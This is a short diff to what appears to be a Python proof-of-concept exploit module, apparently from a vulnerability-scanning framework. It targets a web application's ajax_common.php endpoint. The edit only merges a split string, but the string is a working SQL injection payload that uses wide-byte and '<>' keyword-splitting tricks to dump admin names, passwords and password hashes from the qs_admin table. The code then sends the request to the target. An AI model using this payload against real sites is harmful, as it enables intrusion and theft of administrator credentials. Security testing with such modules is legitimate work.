@@ -75,8 +75,7 @@ class Poc(ABPoc):
 
             vul_url = '{target}'.format(
                 target=self.target)+"/plus/ajax_common.php"
-            paload = ("?act=hotword&query=錦'%20a<>nd%201=2%20un<>ion%20sel<>ect%201,group_concat(admin_name,"
-                      "0x3a,pwd,0x3a,pwd_hash),3%20fr<>om%20qs_admin%23")
+            paload = "?act=hotword&query=錦'%20a<>nd%201=2%20un<>ion%20sel<>ect%201,group_concat(admin_name,0x3a,pwd,0x3a,pwd_hash),3%20fr<>om%20qs_admin%23"
             request = urllib.request.Request(vul_url + paload)
             response = urllib.request.urlopen(request)
             content = str(response.read())
